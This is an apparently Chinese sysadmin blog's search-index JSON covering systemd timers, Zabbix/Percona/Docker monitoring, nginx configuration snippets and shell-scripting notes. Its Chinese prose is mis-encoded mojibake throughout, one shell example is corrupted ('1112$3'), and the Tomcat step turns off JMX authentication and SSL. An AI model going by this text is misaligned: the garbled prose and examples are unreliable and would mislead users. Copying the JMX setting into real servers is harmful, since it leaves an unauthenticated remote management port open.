; Targetçš„å«ä¹‰æ˜¯æœåŠ¡ç»„ï¼Œè¡¨ç¤ºä¸€ç»„æœåŠ¡,ä¸€èˆ¬æ¥è¯´ï¼Œå¸¸ç”¨çš„ Target æœ‰ä¸¤ä¸ªï¼šä¸€ä¸ªæ˜¯multi-user.targetï¼Œè¡¨ç¤ºå¤šç”¨æˆ·å‘½ä»¤è¡ŒçŠ¶æ€ï¼›å¦ä¸€ä¸ªæ˜¯graphical.targetï¼Œè¡¨ç¤ºå›¾å½¢ç”¨æˆ·çŠ¶æ€ï¼Œå®ƒä¾èµ–äºmulti-user.target 4. systemd çš„å®šæ—¶ä»»åŠ¡(.timer) æ‰€è°“å®šæ—¶ä»»åŠ¡ï¼Œå°±æ˜¯æœªæ¥çš„æŸä¸ªæˆ–å¤šä¸ªæ—¶ç‚¹ï¼Œé¢„å®šè¦æ‰§è¡Œçš„ä»»åŠ¡ï¼Œæ¯”å¦‚æ¯äº”åˆ†é’Ÿæ”¶ä¸€æ¬¡é‚®ä»¶ã€æ¯å¤©åŠå¤œä¸¤ç‚¹åˆ†æä¸€ä¸‹æ—¥å¿—ç­‰ç­‰ã€‚ Linux ç³»ç»Ÿé€šå¸¸éƒ½ä½¿ç”¨ cron è®¾ç½®å®šæ—¶ä»»åŠ¡ï¼Œä½†æ˜¯ Systemd ä¹Ÿæœ‰è¿™ä¸ªåŠŸèƒ½ï¼Œè€Œä¸”ä¼˜ç‚¹æ˜¾è‘— è‡ªåŠ¨ç”Ÿæˆæ—¥å¿—ï¼Œé…åˆ Systemd çš„æ—¥å¿—å·¥å…·ï¼Œå¾ˆæ–¹ä¾¿é™¤é”™ å¯ä»¥è®¾ç½®å†…å­˜å’Œ CPU çš„ä½¿ç”¨é¢åº¦ï¼Œæ¯”å¦‚æœ€å¤šä½¿ç”¨50%çš„ CPU ä»»åŠ¡å¯ä»¥æ‹†åˆ†ï¼Œä¾èµ–å…¶ä»– Systemd å•å…ƒï¼Œå®Œæˆéå¸¸å¤æ‚çš„ä»»åŠ¡ æ¯ä¸ªå•å…ƒéƒ½æœ‰ä¸€ä¸ªå•å…ƒæè¿°æ–‡ä»¶ï¼Œå®ƒä»¬åˆ†æ•£åœ¨ä¸‰ä¸ªç›®å½•ã€‚ /lib/systemd/systemï¼šç³»ç»Ÿé»˜è®¤çš„å•å…ƒæ–‡ä»¶ /etc/systemd/systemï¼šç”¨æˆ·å®‰è£…çš„è½¯ä»¶çš„å•å…ƒæ–‡ä»¶ /usr/lib/systemd/systemï¼šç”¨æˆ·è‡ªå·±å®šä¹‰çš„å•å…ƒæ–‡ä»¶ systemd å®šæ—¶ä»»åŠ¡åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ† ä»»åŠ¡æ‰§è¡Œéƒ¨","date":"2019-08-20","objectID":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/:0:0","tags":["linux","ä¼˜åŒ–","systemd","è§£å†³æ–¹æ¡ˆ"],"title":"Systemctlä¹‹systemdè‡ªå®šä¹‰ç³»ç»ŸæœåŠ¡","uri":"/posts/linux/systemctl%E4%B9%8Bsystemd%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"ç›‘æ§è§£å†³æ–¹æ¡ˆ","date":"2019-07-15","objectID":"/posts/linux/%E7%9B%91%E6%8E%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/","tags":["linux","è§£å†³æ–¹æ¡ˆ","ç›‘æ§"],"title":"ç›‘æ§è§£å†³æ–¹æ¡ˆ","uri":"/posts/linux/%E7%9B%91%E6%8E%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"1. tomcat ç›‘æ§æ–¹æ¡ˆ (jmx) zabbix javaGetway zabbix_server ç¼–è¯‘å®‰è£…éœ€å¢åŠ -enable-javaï¼Œyumå®‰è£…çš„éœ€è¦å®‰è£…java java-devel zabbix-java-gateway Tomcatå¼€å¯è¿œç¨‹ç›‘æ§åŠŸèƒ½, /pathto/tomcat/bin/catalina.sh å¤§æ¦‚97è¡Œæ·»åŠ CATALINA_OPTS=\"$CATALINA_OPTS -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.port=12345 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Djava.rmi.server.hostname=\u003ctomcatä¸»æœºip\u003e\" é…ç½®ï¼Œå¹¶è§£æ\u003ctomcatä¸»æœºip\u003e tomcat å¯åŠ¨/pathto/zabbix/sbin/zabbix_java/startup.sh ç«¯å£: 10052 ä¿®æ”¹zabbix_server.confé…ç½®æ–‡ä»¶ï¼Œå¯ç”¨javaPollers,æŒ‡å®šjavaGatewayåœ°å€, 217 è¡Œ: JavaGateway=127.0.0.1 # ip 225 è¡Œ: JavaGatewayPort=10052 # æœ¬åœ°çš„ç«¯å£ 235 è¡Œ: StartJavaPollers=5 # å¯åŠ¨çš„è¿›ç¨‹ä¹¦ zabbix åˆ›å»ºä¸»æœºï¼Œæ·»åŠ jmxæ¥å£ç›‘æ§ï¼Œæ·»åŠ æ¨¡ç‰ˆJMXçš„Template JMX Generic/Template JMX Tomcat 2. mysql ç›‘æ§æ–¹æ¡ˆ (percona + zabbix) https://www.percona.com/doc/percona-monitoring-plugins/LATEST/zabbix/index.html#installation-instructions å®‰è£…ä¾èµ–åŒ… yum install -y php php-mysql # æ³¨æ„ å®‰è£…php ä¼šé»˜è®¤å®‰è£…httpd,å»ºè®®æ‰‹åŠ¨ç¼–è¯‘ wget 'https://www.percona.com/downloads/percona-monitoring-plugins/percona-monitoring-plugins-1.1.8/binary/redhat/7/x86_64/percona-zabbix-templates-1.1.8-1.noarch.rpm' rpm -ivh percona-zabbix-templates-1.1.8-1.noarch.rpm cp /var/lib/zabbix/percona/templates/userparameter_percona_mysql.conf /usr/local/zabbix/etc/zabbix/zabbix_agentd.d/ ä¿®æ”¹phpè„šæœ¬é…ç½® vim /var/lib/zabbix/percona/scripts/ss_get_mysql_stats.php $mysql_user = ''; $mysql_pass = ''; 3. docker ç›‘æ§è§£å†³æ–¹æ¡ˆ zabbix + docker https://segmentfault.com/a/1190000007568413 useradd zabbix -M -s /sbin/nologin sudo usermod -aG docker zabbix /opt/soft mkdir zabbix32 cd zabbix32 svn co svn://svn.zabbix.com/branches/3.2 . ./bootstrap.sh ./configure --enable-agent --prefix=/opt/zabbix.docker make install mkdir src/modules/zabbix_module_docker cd src/modules/zabbix_module_docker wget https://raw.githubusercontent.com/monitoringartist/Zabbix-Docker-Monitoring/master/src/modules/zabbix_module_docker/zabbix_module_docker.c wget https://raw.githubusercontent.com/monitoringartist/Zabbix-Docker-Monitoring/master/src/modules/zabbix_module_docker/Makefile make mkdir /opt/zabbix.docker/module/ cp zabbix_module_docker.so /opt/zabbix.docker/module/ # zabbix_agentd.conf LoadModulePath=/opt/zabbix.docker/module/ LoadModule=zabbix_module_docker.so cAvisor+InfluxDB+Grafana ### influxdb ### [root@00 ~]# docker run -d --name influxdb --net monitor -p 8083:8083 -p 8086:8086 tutum/influxdb # ç®¡ç†é¡µé¢ # http://\u003cip\u003e:8083/ ## # ä»¥ä¸‹å¯è¾“å…¥å‘½ä»¤åœ¨é€‰æ‹©æ¡†ä¸­å‡æœ‰æç¤º # åˆ›å»ºcadvisor æ•°æ®åº“ ,åœ¨è¾“å…¥æ ä¸­è¾“å…¥:CREATE DATABASE \"cadvisor\" ç„¶åå›è½¦ # æŸ¥çœ‹åˆ›å»ºçš„æ•°æ®,åœ¨è¾“å…¥æ ä¸­è¾“å…¥: SHOW DATABASES ç„¶åå›è½¦ # åˆ›å»ºgrafana è¿æ¥ç”¨æˆ·,åœ¨è¾“å…¥æ ä¸­è¾“å…¥: CREATE USER \"grafana\" WITH PASSWORD 'xxxxxx' ç„¶åå›è½¦ # æŸ¥çœ‹åˆ›å»ºçš„ç”¨æˆ·,åœ¨è¾“å…¥æ è¾“å…¥: SHOW USERS ç„¶åå›è½¦ï¼Œ ## ### cadvisor ### [root@00 ~]# docker run -d --name=cadvisor --net monitor -p 8084:8080 -v /:/rootfs:ro -v /var/run:/var/run -v /sys:/sys:ro -v /var/lib/docker:/var/lib/docker:ro google/cadvisor -storage_driver=influxdb -storage_driver_db=cadvisor -storage_driver_host=influxdb:8086 # [root@00 ~]# docker run -d --name=cadvisor --net monitor -p 8084:8080 --mount type=bind,src=/,dst=/rootfs,ro --mount type=bind,src=/var/run,dst=/var/run --mount type=bind,src=/sys,dst=/sys,ro --mount type=bind,src=/var/lib/docker,dst=/var/lib/docker,ro google/cadvisor -storage_driver=influxdb -storage_driver_db=cadvisor -storage_driver_host=influxdb:8086 #ç®¡ç†é¡µé¢ #http://\u003cip\u003e:8084/ ### grafana ### [root@00 ~]# docker run -d --name grafana --net monitor -p 3000:3000 grafana/grafana #ç®¡ç†é¡µé¢ # http://\u003cip\u003e:3000/ ","date":"2019-07-15","objectID":"/posts/linux/%E7%9B%91%E6%8E%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/:0:0","tags":["linux","è§£å†³æ–¹æ¡ˆ","ç›‘æ§"],"title":"ç›‘æ§è§£å†³æ–¹æ¡ˆ","uri":"/posts/linux/%E7%9B%91%E6%8E%A7%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"},{"categories":["linux","è¿ç»´è®°äº‹","æ•´ç†æ”¶é›†"],"content":"Nginxå¸¸ç”¨éªšæ“ä½œ","date":"2019-05-31","objectID":"/posts/linux/nginx%E5%B8%B8%E7%94%A8%E9%AA%9A%E6%93%8D%E4%BD%9C/","tags":["linux","nginx","è§£å†³æ–¹æ¡ˆ"],"title":"Nginxå¸¸ç”¨éªšæ“ä½œ","uri":"/posts/linux/nginx%E5%B8%B8%E7%94%A8%E9%AA%9A%E6%93%8D%E4%BD%9C/"},{"categories":["linux","è¿ç»´è®°äº‹","æ•´ç†æ”¶é›†"],"content":"nginx if else å®ç° set $is_matched 0; if ($http_user_agent ~* \"wget\") { set $is_matched \"${is_matched}1\"; } if ($remote_addr ~ \"127.0.0.1|172.16.11.10\") { set $is_matched \"${is_matched}01\"; } # æ»¡è¶³æ¡ä»¶: # å½“ http_user_agent == wget or remote_addr = ip # is_matched å€¼ä¸º 01 001 # å½“æ¡ä»¶ä¸º http_user_agent == wget and remote_addr = ip # is_matched å€¼ä¸º 0101 if ($is_matched = \"01\"){ return 403; } nginx è·å–cdn ip åŠ ip(æ®µ)è®¿é—®é™åˆ¶ # http map $http_x_forwarded_for $client_real_ip { \"\" $remote_addr; # fix: å…¼å®¹ipv6 ~^(?P\u003cfirstAddr\u003e[0-9a-fA-F:.]+),?.*$ $firstAddr; } set $is_allow 0; # location,server if ( $client_real_ip ~* '^(223)\\.(193)\\.(97)\\.(.*)$' ) { set $is_allow 1; } if ($client_real_ip ~ '172.31.11.111|127.0.0.1'){ set $is_allow 1; } if ( $client_real_ip ~* \"172\\.31\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\" ) { set $is_allow 1; } # and å®ç° if ( $is_allow = \"1\" ){ return 200; } return 502; nginx ä»£ç†, éæ ¹ç›®å½• åˆ°æ ¹ç›®å½• location /frps/ { proxy_pass http://$host:$server_port/; proxy_set_header Host $host:$server_port; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_redirect / /frps/; #rewrite ^/frps/(.*)$ /$1 break; } Nginxå‘å¸ƒAliasè™šæ‹Ÿç›®å½•åŠPHPæ”¯æŒé…ç½®æ–¹æ³• location /owa { alias /pathto/owa; index index.php index.html index.htm; } location ~ /owa/.+.php.*$ { if ($fastcgi_script_name ~ /owa/(.+.php.*)$) { set $valid_fastcgi_script_name $1; } fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_connect_timeout 150; fastcgi_read_timeout 150; fastcgi_send_timeout 150; fastcgi_buffer_size 256k; fastcgi_buffers 16 256k; fastcgi_busy_buffers_size 512k; fastcgi_temp_file_write_size 512k; fastcgi_param SCRIPT_FILENAME /pathto/owa/$valid_fastcgi_script_name; #fastcgi_param SCRIPT_FILENAME /pathto/$fastcgi_script_name; include fastcgi_params; } Nginx ä»»æ„åŸŸååŒ¹é…åŠrootè·¯å¾„å®šä½ # è¿™æ®µé…ç½®çš„ä½œç”¨æ˜¯ åŒ¹é…ä»»æ„åŸŸåï¼Œå­åŸŸå(subdomain)ã€ä¸»åŸŸå(maindomain)ã€é¡¶çº§åŸŸå(tld) , å­åŸŸåå¯æœ‰å¯æ—  # ç„¶åæ ¹æ®åŒ¹é…å€¼ å°†rootè·¯å¾„è®¾ç½®ä¸º åŒ¹é…åˆ°çš„å€¼($host) ## server server_name ~^(?:(?\u003csubdomain\u003e.+)\\.)?(?\u003cmaindomain\u003e[^\\.]+)\\.(?\u003ctld\u003e.+)$; set $root_path /data/wwwroot/$host; if (!-d $root_path){ set $root_path /data/wwwroot/www.$host; } root $root_path; ","date":"2019-05-31","objectID":"/posts/linux/nginx%E5%B8%B8%E7%94%A8%E9%AA%9A%E6%93%8D%E4%BD%9C/:0:0","tags":["linux","nginx","è§£å†³æ–¹æ¡ˆ"],"title":"Nginxå¸¸ç”¨éªšæ“ä½œ","uri":"/posts/linux/nginx%E5%B8%B8%E7%94%A8%E9%AA%9A%E6%93%8D%E4%BD%9C/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Shellscriptç›¸å…³","date":"2019-05-31","objectID":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/","tags":["linux","shellscript"],"title":"Shellscriptç›¸å…³","uri":"/posts/linux/shellscript%E7%9B%B8%E5%85%B3/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"1. shell è„šæœ¬æ‰§è¡Œçš„å‡ ç§æ–¹æ³• bash(sh) /path/script.sh èµ‹äºˆæ‰§è¡Œæƒé™ /path/script.sh æˆ– ./scripts.sh source script.sh æˆ– . script.sh åœ¨æ­¤æ–¹æ³•ä¸­æ‰§è¡Œ,å­ shell ä¸­å®šä¹‰çš„å˜é‡,å¯åœ¨çˆ¶ shell ä¸­è°ƒç”¨(å…¶ä»–æ–¹å¼çˆ¶ shell ä¸èƒ½ç›´æ¥è°ƒç”¨å­ shell çš„å˜é‡) bash(sh) \u003c script.sh æˆ– cat script.sh | bash(sh) 2. shell è„šæœ¬è§„èŒƒ ä»¥ #!/bin/bash æˆ– #!/bin/sh å¼€å¤´ æ³¨é‡Šæ ‡æ³¨, ä½œè€…ã€è”ç³»æ–¹å¼ã€æ—¶é—´ã€ç‰ˆæœ¬ã€è„šæœ¬æè¿° è„šæœ¬å°½é‡ä¸æ˜¯ä½¿ç”¨ä¸­æ–‡æ³¨é‡Š è„šæœ¬ä»¥.sh ä¸ºæ‰©å±•å æˆå¯¹ä¹¦å†™ç¬¦å·ã€æ¡ä»¶æ§åˆ¶è¯­å¥ç­‰ã€‚å¦‚: []ã€{}ã€if []; then fi 3. å˜é‡çš„è®¾ç½®ä¸å–æ¶ˆ è®¾ç½® : å˜é‡å=å€¼ å˜é‡åä¸€èˆ¬å¤§å†™ æ‰“å° : echo $å˜é‡å å–æ¶ˆ : unset å˜é‡å 4. å˜é‡å®šä¹‰ 4.1. æ™®é€šå˜é‡å®šä¹‰ å˜é‡å=value å˜é‡å='value' å˜é‡å=\"value\" å˜é‡å=$(ls) å˜é‡å=`ls` 4.2. å˜é‡åå®šä¹‰è¦æ±‚ å˜é‡åä¸€èˆ¬ç”±å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ç»„æˆ 4.3. ç¤ºä¾‹ a=123 b=123-$a ## å½“å€¼æ²¡æœ‰å•(åŒ)å¼•å·çš„æ—¶å€™,å˜é‡çš„å€¼ä¸º 123-å˜é‡ a çš„å€¼,è‹¥å˜é‡å€¼å‡ºç°ç©ºæ ¼ï¼Œåˆ™å€¼ä¸ºç¬¬ä¸€ä¸ªç©ºæ ¼ä¹‹å‰çš„æ•°æ® c='123-$a' ## å½“å€¼å­˜åœ¨å•å¼•å·çš„æ—¶å€™,å€¼ä¸ºä»€ä¹ˆï¼Œæ‰“å°ç»“æœåˆ™ä¸ºä»€ä¹ˆï¼Œå¼•å·å†…å†…å®¹è§†ä¸ºä¸€ä¸ªæ•´ä½“ d=\"123-$a\" ## å½“å€¼ä¸ºåŒå¼•å·çš„æ—¶å€™,è‹¥å€¼ä¸­å­˜åœ¨å˜é‡ã€å‘½ä»¤(éœ€è¦è½¬ä¹‰)ç­‰ï¼Œä¼šä¼˜å…ˆæŠŠå˜é‡ã€å‘½ä»¤ç»“æœè¾“å‡º,åœ¨æ‰“å°æ‰€æœ‰å€¼ 5. ç‰¹æ®Šã€å†…ç½®å˜é‡ å˜é‡å è¯´æ˜ $0 è·å–å½“å‰æ‰§è¡Œè„šæœ¬çš„åç§°,å¦‚æœæ‰§è¡Œè„šæœ¬å¸¦æœ‰è·¯å¾„,åˆ™åŒ…å«è„šæœ¬è·¯å¾„ $n è·å–å½“å‰æ‰§è¡Œè„šæœ¬çš„ç¬¬ n ä¸ªå‚æ•°,n=1-9ï¼Œn ä¸º 0 æ—¶,è¡¨ç¤ºè„šæœ¬æ–‡ä»¶å,å¦‚æœ n å¤§äº 9,ç”¨å¤§æ‹¬å·æ‹¬èµ·æ¥${10},å‚æ•°ä»¥ç©ºæ ¼éš”å¼€ $* è·å–å½“å‰è„šæœ¬æ‰€æœ‰ä¼ å…¥çš„å‚æ•°,å°†æ‰€æœ‰çš„å‚æ•°è§†ä¸ºå•ä¸ªå­—ç¬¦ä¸²,ç›¸å½“äº\"1112$3\"â€¦ $# è·å–å½“å‰è„šæœ¬ä¼ å…¥å‚æ•°çš„ä¸ªæ•°æ€»æ•° $@ è·å–å½“å‰è„šæœ¬æ‰€æœ‰ä¼ å…¥å‚æ•°,å°†æ‰€æœ‰çš„å‚æ•°åˆ†åˆ«ä¼ å…¥è‡³å…¶ä»–å˜é‡æˆ–è„šæœ¬(è·å–è„šæœ¬æœ€åä¸€ä¸ªå‚æ•°:${@: -1} $? ç¡®å®šä¸Šä¸€ä¸ªæŒ‡ä»¤çš„è¿”å›å€¼ï¼Œ0 æˆåŠŸ, é 0 ä¸æˆåŠŸ 2: æƒé™æ‹’ç» ; 1-125: è¿è¡Œå¤±è´¥,å‚æ•°ä¼ é€’é”™è¯¯ ; 126: æ‰¾åˆ°è¯¥å‘½ä»¤,ä½†æ— æ³•æ‰§è¡Œ ; 127:æœªæ‰¾åˆ°è¿è¡Œçš„å‘½ä»¤ ; 128: å‘½ä»¤è¢«å¼ºè¡Œä¸­æ–­ ; è„šæœ¬ä¸­ä¸€èˆ¬ç”¨exit 0 , åœ¨æ‰§è¡Œè„šæœ¬,è¿”å›å€¼ç»™$?, å‡½æ•°ä¸­ä¸€èˆ¬ç”¨return è¿”å›å€¼ç»™$? $$ å½“å‰è„šæœ¬æ‰§è¡Œçš„è¿›ç¨‹å· $! è·å¾—ä¹‹å‰(ä¸Šä¸€ä¸ª)è¿›ç¨‹ ID $_ ä¸Šä¸€æ¡å‘½ä»¤çš„æœ€åä¸€ä¸ªå‚æ•° $PPID çˆ¶è¿›ç¨‹çš„è¿›ç¨‹ ID $PS1 ä¸»æç¤ºç¬¦ä¸²ï¼Œé»˜è®¤å€¼æ˜¯$ $* å’Œ $@ çš„ç¤ºä¾‹: [root@00 ~]# set -- hello my \"linux shell\" [root@00 ~]# echo $# 3 [root@00 ~]# echo $1 hello [root@00 ~]# echo $2 my [root@00 ~]# echo $3 linux shell [root@00 ~]# for i in \"$@\"; do echo $i;done hello my linux shell [root@00 ~]# for i in \"$*\"; do echo $i;done hello my linux shell 6. å¸¸ç”¨æ“ä½œè¡¨è¾¾å¼ è¡¨è¾¾å¼ è¯´æ˜ ${#string} è¿”å›$stringçš„é•¿åº¦ ${string:position} åœ¨$stirngä¸­,ä»$positionä¹‹åå¼€å§‹æå–å­ä¸² ${string:position:length} åœ¨$string,ä»ä½ç½®$positionä¹‹åå¼€å§‹æå–é•¿åº¦ä¸º$lengthçš„å­ä¸² ${string#substring} ä»å˜é‡$stringå¼€å¤´å¼€å§‹åˆ é™¤æœ€çŸ­åŒ¹é…$substringçš„å­ä¸² ${string##substring} ä»å˜é‡$stringå¼€å¤´å¼€å§‹åˆ é™¤æœ€é•¿åŒ¹é…$substringçš„å­ä¸² ${string%substring} ä»å˜é‡$stringç»“å°¾å¼€å§‹åˆ é™¤æœ€çŸ­åŒ¹é…$substringçš„å­ä¸² ${string%%substring} ä»å˜é‡$stringç»“å°¾å¼€å§‹åˆ é™¤æœ€é•¿åŒ¹é…$substringçš„å­ä¸² ${string/pattern/parameter} åœ¨å˜é‡stringä¸­,ä½¿ç”¨parameteræ›¿æ¢patternåŒ¹é…çš„ç¬¬ä¸€ä¸ªå€¼ ${string//pattern/parameter} åœ¨å˜é‡stringä¸­,ä½¿ç”¨parameteræ›¿æ¢æ‰€æœ‰patternåŒ¹é…çš„å€¼ ${string/#pattern/parameter} åœ¨å˜é‡stringä¸­,ä½¿ç”¨parameteræ›¿æ¢ä»¥patternå¼€å¤´çš„å€¼ ${string/%pattern/parameter} åœ¨å˜é‡stringä¸­,ä½¿ç”¨parameteræ›¿æ¢ä»¥patternç»“å°¾çš„å€¼ 7. å˜é‡æ›¿æ¢è¡¨ è¿ç®—ç¬¦å· æ›¿æ¢ ${value:-word} å¦‚æœå˜é‡valueå­˜åœ¨ä¸”énullï¼Œåˆ™è¿”å›å˜é‡çš„å€¼,å¦åˆ™,è¿”å›wordå­—ç¬¦ä¸². ä¾‹: res=${value:-word},å¦‚æœvalueæœªå®šä¹‰,åˆ™resçš„å€¼ä¸ºword ${value:=word} å¦‚æœå˜é‡valueå­˜åœ¨ä¸”énullï¼Œåˆ™è¿”å›å˜é‡çš„å€¼,å¦åˆ™,åˆ™è®¾ç½®è¿™ä¸ªå˜é‡å€¼ä¸ºword. ä¾‹: res=${value:=word},å¦‚æœvalueæœªå®šä¹‰,åˆ™resçš„å€¼ä¸ºword,valueå€¼ä¹Ÿä¸ºword ${value:+word} å¦‚æœvalueå­˜åœ¨ä¸”énull,åˆ™è¿”å›word,å¦åˆ™è¿”å›null.ä¾‹res=${value:+word},å¦‚æœvalueå·²ç»å®šä¹‰, åˆ™resçš„å€¼ä¸ºword,å¦‚æœvalueå€¼æœªå®šä¹‰,åˆ™reså€¼ä¸ºnull(ç©º) ${value:?message} å¦‚æœå˜é‡valueå­˜åœ¨ä¸”énullï¼Œåˆ™è¿”å›å˜é‡valueçš„å€¼ï¼Œå¦åˆ™è¿”å›ä¿¡æ¯bash: value: message,ä¾‹ echo ${value:?is null},å¦‚æœvalueå€¼å·²å®šä¹‰ï¼Œåˆ™è¿”å›valueå®šä¹‰å€¼,å¦è€…è¿”å› bash: value: is null,é€€å‡ºçŠ¶æ€ç ä¸º1 8. å¸¸è§çš„è¿ç®—ç¬¦ åœ¨Shellè„šæœ¬ä¸­ï¼Œ[]å’Œ[[]]éƒ½ç”¨äºæ¡ä»¶æµ‹è¯•ï¼Œä½†å®ƒä»¬ä¹‹é—´å­˜åœ¨ä¸€äº›é‡è¦çš„å·®å¼‚ å…¼å®¹æ€§ï¼š[]æ˜¯POSIXæ ‡å‡†çš„æµ‹è¯•è¯­å¥ï¼Œå› æ­¤å®ƒåœ¨æ‰€æœ‰POSIXå…¼å®¹çš„shellä¸­éƒ½å¯ä»¥ä½¿ç”¨ï¼ŒåŒ…æ‹¬bashã€dashã€kshç­‰ã€‚è€Œ[[]]æ˜¯bashçš„æ‰©å±•ï¼Œåªèƒ½åœ¨bashå’Œä¸€äº›å…¼å®¹bashçš„shellä¸­ä½¿ç”¨ï¼Œå¦‚zshã€‚ æ’åºï¼šåœ¨[[]]ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨\u003cå’Œ\u003eæ¥æ¯”è¾ƒå­—ç¬¦ä¸²çš„å­—å…¸åºã€‚ä¾‹å¦‚ï¼Œ[[ \"abc\" \u003c \"def\" ]]ä¼šè¿”å›çœŸã€‚è€Œåœ¨[]ä¸­ï¼Œè¿™æ ·çš„æ¯”è¾ƒä¼šå¯¼è‡´è¯­æ³•é”™è¯¯ã€‚ é€»è¾‘æ“ä½œç¬¦ï¼šåœ¨[]ä¸­ï¼Œä½ éœ€è¦ä½¿ç”¨-aå’Œ-oæ¥è¡¨ç¤ºé€»è¾‘ä¸å’Œé€»è¾‘æˆ–ã€‚ä¾‹å¦‚ï¼Œ[ \"$a\" -eq 1 -a \"$b\" -eq 2 ]ã€‚è€Œåœ¨[[]]ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨æ›´ç›´è§‚çš„\u0026\u0026å’Œ||ã€‚ä¾‹å¦‚ï¼Œ[[ \"$a\" -eq 1 \u0026\u0026 \"$b\" -eq 2 ]]ã€‚ å­—ç¬¦ä¸²åŒ¹é…ï¼šåœ¨[[]]ä¸­ï¼Œ==å³è¾¹çš„å­—ç¬¦ä¸²ä¼šè¢«è§†ä¸ºæ¨¡å¼ï¼Œè€Œåœ¨[]ä¸­ï¼Œå®ƒåªæ˜¯ä¸€ä¸ªæ™®é€šçš„å­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼Œ[[ \"$a\" == a* ]]ä¼šæ£€æŸ¥$aæ˜¯å¦ä»¥aå¼€å¤´ï¼Œè€Œ[ \"$a\" == a* ]ä¼šæ£€æŸ¥$aæ˜¯å¦ç­‰äºå­—ç¬¦ä¸²a*ã€‚ æ­£åˆ™åŒ¹é…ï¼š[[]]æ”¯æŒä½¿ç”¨=~è¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ã€‚ä¾‹å¦‚ï¼Œ[[ \"$a\" =~ ^a.* ]]ä¼šæ£€æŸ¥$aæ˜¯å¦ä»¥aå¼€å¤´ã€‚è€Œ[]ä¸æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼ã€‚ å˜é‡å¼•ç”¨ï¼šåœ¨[]ä¸­ï¼Œå¦‚æœä¸€ä¸ªå˜é‡æœªå®šä¹‰ï¼Œé‚£ä¹ˆå®ƒä¼šè¢«è§†ä¸ºä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼Œé™¤éä½ ç”¨åŒå¼•å·å¼•èµ·æ¥ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ$aæœªå®šä¹‰ï¼Œé‚£ä¹ˆ[ $a == \"\" ]ä¼šå¯¼è‡´è¯­æ³•é”™è¯¯ï¼Œè€Œ[ \"$a\" == \"\" ]åˆ™ä¸ä¼šã€‚è€Œåœ¨[[]]ä¸­ï¼Œå³ä½¿å˜é‡æœªå®šä¹‰ï¼Œä¹Ÿä¸éœ€è¦å¼•å·ã€‚ 8.1. å˜é‡è¿ç®—ç¬¦ è¿ç®—ç¬¦ è¯´æ˜ ++ -- è‡ªå¢ä¸è‡ªå‡; ç¬¦å·åœ¨å‰ä»£è¡¨å…ˆè¿ç®—åœ¨èµ‹å€¼ï¼Œç¬¦å·åœ¨åä»£è¡¨å…ˆèµ‹å€¼åœ¨è¿ç®— - + - ! ~ - - * / % ä¹˜ã€é™¤ã€æ¨¡ / å–æ•´ ; % å–ä½™ + - åŠ ã€å‡ - \u003c \u003c= \u003e \u003e= å°äºã€å°äºç­‰äºã€å¤§äºã€å¤§äºç­‰äº - == != =~ ç­‰äºã€ä¸ç­‰äºã€æ­£åˆ™åŒ¹é…ç¬¦ [[ $VAR =~ ^[a-zA-Z] ]],æ­£åˆ™ä¸å¯ç”¨å¼•å·æ‹¬èµ·æ¥,å˜é‡å¯å•åŒå¼•å· \u003c\u003c \u003e\u003e ä½è¿ç®—: å·¦ç§»ã€å³ç§» äºŒè¿›åˆ¶è®¡ç®— \u0026\u0026 é€»è¾‘çš„ and true \u0026\u0026 false ,ç»“æœ false ` ` = += -= *= /= %= èµ‹å€¼è¿ç®— (a+=b) == (a=a+b); å…¶ä»–åŒç† ** å¹•è¿ç®— 2**3=8 8.2. ç®—æœ¯è¿ç®—ç¬¦ å­—ç¬¦ä¸²æ¯”è¾ƒè¿ç®—ç¬¦(å»ºè®®åœ¨(())å’Œ[[]]ä¸­ä½¿ç”¨çš„) ç®—æœ¯è¿ç®—ç¬¦(å»ºè®®åœ¨[]ä»¥åŠtestä¸­ä½¿ç”¨çš„) è¯´æ˜ ==æˆ–= -eq æ£€æµ‹ 2 ä¸ªæ•°æ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰è¿”å›true != -ne æ£€æµ‹ 2 ä¸ªæ•°æ˜¯å¦ä¸ç›¸ç­‰ï¼Œç›¸ç­‰è¿”å›true \u003e -gt æ£€æµ‹å·¦è¾¹çš„æ•°æ˜¯å¦å¤§äºå³è¾¹çš„ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å›true \u003e= -ge æ£€æµ‹å·¦è¾¹çš„æ•°æ˜¯å¦å¤§äºç­‰äºå³è¾¹çš„ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å›true \u003c -lt æ£€æµ‹å·¦è¾¹çš„æ•°æ˜¯å¦å°äºå³è¾¹çš„ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å›true \u003c= -le 